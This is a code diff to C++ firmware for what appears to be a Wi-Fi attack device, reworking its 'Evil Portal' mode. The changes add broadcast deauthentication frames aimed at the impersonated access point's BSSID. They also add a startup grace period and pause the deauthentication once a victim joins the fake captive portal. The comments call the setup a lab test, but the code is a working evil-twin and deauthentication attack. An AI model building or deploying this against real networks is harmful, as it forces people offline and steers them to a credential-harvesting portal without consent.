@@ -26,6 +26,8 @@ constexpr uint8_t SSID_FINDER_SWITCH_CYCLES = 2;
 constexpr uint16_t DEAUTH_TX_INTERVAL_MS = 10;
 constexpr uint16_t ACTIVE_SNIFFER_DEAUTH_INTERVAL_MS = 250;
 constexpr uint16_t EVIL_PORTAL_DEAUTH_INTERVAL_MS = 125;
+constexpr uint16_t EVIL_PORTAL_STARTUP_GRACE_MS = 1500;
+constexpr uint16_t EVIL_PORTAL_CLIENT_REARM_MS = 1000;
 constexpr uint16_t EVIL_PORTAL_UI_REFRESH_MS = 250;
 constexpr uint32_t EVIL_PORTAL_MINIMUM_FREE_HEAP = 64 * 1024;
 constexpr uint8_t EVIL_PORTAL_VISIBLE_ROWS = 13;
@@ -3673,9 +3675,11 @@ void WiFiScan::drawEvilPortalStatus() {
         color = TFT_CYAN;
       }
       else if (logical_line == 2) {
-        snprintf(line, sizeof(line), "EPdeauth:%s",
-                 this->ep_deauth ? "ACTIVE" : "OFF");
-        color = this->ep_deauth ? TFT_GREEN : TFT_DARKGREY;
+        const char* deauth_state = !this->ep_deauth ? "OFF" :
+                                   (clients > 0 ? "PAUSED" : "ACTIVE");
+        snprintf(line, sizeof(line), "EPdeauth:%s", deauth_state);
+        color = !this->ep_deauth ? TFT_DARKGREY :
+                (clients > 0 ? TFT_YELLOW : TFT_GREEN);
       }
       else if (logical_line == 3) {
         if (!this->ep_deauth)
@@ -3726,10 +3730,11 @@ void WiFiScan::drawEvilPortalStatus() {
         color = this->deauth_tx_failures == 0 ? TFT_GREEN : TFT_RED;
       }
       else if (logical_line == 8) {
-        strlcpy(line, this->ep_deauth ? "OK=driver, no ACK" :
-                                         "Deauth disabled",
+        strlcpy(line, !this->ep_deauth ? "Deauth disabled" :
+                      (clients > 0 ? "Paused: client on AP" :
+                                     "OK=driver, no ACK"),
                 sizeof(line));
-        color = this->ep_deauth ? TFT_YELLOW : TFT_DARKGREY;
+        color = !this->ep_deauth ? TFT_DARKGREY : TFT_YELLOW;
       }
       else if (logical_line == 9) {
         if (clients > 0)
@@ -4360,7 +4365,6 @@ void WiFiScan::StopScan(uint8_t scan_mode) {
   this->resetActiveSnifferDeauth();
   this->deauth_ap_cursor = 0;
   this->deauth_station_cursor = 0;
-  this->evil_portal_deauth_cursor = 0;
   this->deauth_next_tx_ms = 0;
   this->evil_portal_deauth_next_ms = 0;
   this->deauth_tx_attempts = 0;
@@ -5690,8 +5694,7 @@ bool WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color) {
     this->prepareScanStage(TFT_MAGENTA, TFT_BLACK);
   #endif
 
-  this->evil_portal_deauth_cursor = 0;
-  this->evil_portal_deauth_next_ms = millis();
+  this->evil_portal_deauth_next_ms = 0;
   this->deauth_tx_attempts = 0;
   this->deauth_tx_accepted = 0;
   this->deauth_tx_failures = 0;
@@ -5716,6 +5719,12 @@ bool WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color) {
   this->wifi_initialized = true;
   this->deauth_tx_ready = true;
   initTime = millis();
+  // Give the SoftAP, DHCP/DNS, and captive HTTP handlers time to become visible
+  // before sharing the C5 radio with a deauthentication frame. This does not
+  // force a station to join: the test device still needs a compatible saved
+  // network profile (or an explicit user connection).
+  this->evil_portal_deauth_next_ms =
+      initTime + EVIL_PORTAL_STARTUP_GRACE_MS;
   this->drawEvilPortalStatus();
   Serial.printf("[Evil Portal] started; heap %lu -> %lu bytes\n",
                 static_cast<unsigned long>(available_heap),
@@ -11500,6 +11509,29 @@ bool WiFiScan::sendNextSelectedAPDeauth(const uint8_t destination[6],
   return false;
 }
 
+bool WiFiScan::sendEvilPortalAnchorDeauth() {
+  const int anchor_index = evil_portal_obj.getTargetAPIndex();
+  if (access_points == nullptr || anchor_index < 0 ||
+      anchor_index >= access_points->size()) {
+    this->deauth_active_ap_index = -1;
+    this->deauth_active_station_index = -1;
+    return false;
+  }
+
+  const AccessPoint anchor = access_points->get(anchor_index);
+  if (!anchor.selected || !this->validDeauthChannel(anchor.channel)) {
+    this->deauth_active_ap_index = -1;
+    this->deauth_active_station_index = -1;
+    return false;
+  }
+
+  static constexpr uint8_t broadcast[6] = {
+      0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+  this->deauth_active_ap_index = anchor_index;
+  this->deauth_active_station_index = -1;
+  return this->sendDeauthFrame(anchor.bssid, anchor.channel, broadcast) > 0;
+}
+
 bool WiFiScan::sendNextSelectedStationDeauth() {
   if (access_points == nullptr || stations == nullptr ||
       access_points->size() <= 0) {
@@ -14582,17 +14614,21 @@ void WiFiScan::main(uint32_t currentTime)
     }
   }
   else if (currentScanMode == WIFI_SCAN_EVIL_PORTAL) {
-    if (this->ep_deauth &&
+    if (this->ep_deauth && evil_portal_obj.isRunning() &&
         static_cast<int32_t>(currentTime -
                              this->evil_portal_deauth_next_ms) >= 0) {
       this->evil_portal_deauth_next_ms =
           currentTime + EVIL_PORTAL_DEAUTH_INTERVAL_MS;
-      static constexpr uint8_t broadcast[6] = {
-          0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-      if (this->sendNextSelectedAPDeauth(
-              broadcast, this->evil_portal_deauth_cursor)) {
+      // Once the lab client joins the portal, stop spending airtime on
+      // deauthentication and leave the radio anchored for DHCP, DNS, and HTTP.
+      // If it disconnects, wait briefly before rearming the bounded scheduler.
+      if (evil_portal_obj.getConnectedClientCount() > 0) {
+        this->evil_portal_deauth_next_ms =
+            currentTime + EVIL_PORTAL_CLIENT_REARM_MS;
+      }
+      else if (this->sendEvilPortalAnchorDeauth()) {
         // The C5 has one Wi-Fi radio. Return it to the portal's anchor channel
-        // immediately after each bounded off-channel transmission batch.
+        // immediately after the bounded transmission batch.
         const uint8_t portal_channel = evil_portal_obj.getTargetAPChannel();
         if (this->validDeauthChannel(portal_channel) &&
             this->set_channel != portal_channel)
